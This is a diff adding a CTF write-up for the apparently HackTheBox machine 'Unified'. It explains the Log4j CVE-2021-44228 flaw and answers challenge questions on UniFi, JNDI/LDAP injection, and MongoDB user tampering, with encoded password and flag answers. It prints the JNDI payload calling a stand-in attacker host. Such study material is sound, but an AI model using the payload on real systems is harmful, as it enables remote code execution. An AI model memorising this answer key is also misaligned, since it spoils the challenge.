@@ -1,0 +1,67 @@
+----------Unified Write-up----------
+               by Raptor
+
+1. What is Log4j? -
+
+Log4j is an open-source logging framework that allows software developers to log various data within their application and it is part of the Apache Logging Services, a project of the Apache Software Foundation. Log4j is used by thousands of websites and applications, to perform some important functions such as logging information which can be used for debugging and other purposes. 
+
+2. What is Log4j vulnerability? -
+
+Log4j vulnerability is a critical vulnerability, affects Apache Log4j 2 versions 2.0 to 2.14.1, as identified by Chen Zhaojun of the Alibaba Cloud Security Team. NIST published a critical CVE in the National Vulnerability Database on December 10th, 2021, naming this as CVE-2021–44228. Apache Software Foundation assigned the maximum CVSS severity rating of 10.
+
+The vulnerability allows unauthenticated remote code execution. Attackers can take advantage of it by just insert a line of code like ${jndi:ldap://[attacker_URL]} . This vulnerability can be found in products of some of the most famous technology vendors such as AWS, IBM, Cloudflare, Cisco, iCloud, Minecraft: Java Edition, Steam, and VMWare. In this blog we learn about this vulnerability in details.
+SOURCE(InfoSec)
+ 
+------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
+What ports are open? 
+22,6789,8080,8443
+
+Name of the software that is running on the highest port?
+UniFi Network 
+
+What is the version of the software that is running? 
+6.4.54 
+
+What is the CVE for the identified vulnerability?
+CVE-2021-44228 
+
+What is the version of Maven that we installed? 
+3.6.3
+
+What protocol does JDNI leverage in the injection?
+LDAP
+
+What tool do we use to intercept the traffic, indicating the attack was successful? 
+tcpdump
+
+ What port do we need to inspect intercepted traffic for? 
+ 389
+
+What port is the MongoDB service running on? 
+27117 
+
+What is the default database name for UniFi applications? 
+ace
+
+What is the function we use to enumerate users within the database in MongoDB? 
+db.admin.find() 
+
+What is the function to add data to the database in MongoDB?
+db.admin.insert()
+
+What is the function we use to update users within the database in MongoDB? 
+db.admin.update()
+
+------> The following answeres are encrypted form... To get the answer, solve it using cyberchef hint: Just one recipe from the top :)
+
+
+
+What is the password for the root user? 
+grPxyzJbv8Jtv8jswAN7q=J=E=jeJlzb+4ib
+
+Submit user flag 
+JrJFw4l7JrkI28zoJKwK+4vb+mJevKkG+KvbvrkY+Kq5
+
+Submit root flag 
+wgzGvr+L+o+=J8io+dfFJmibJdje+rv=JdlK+d+o24k5
+
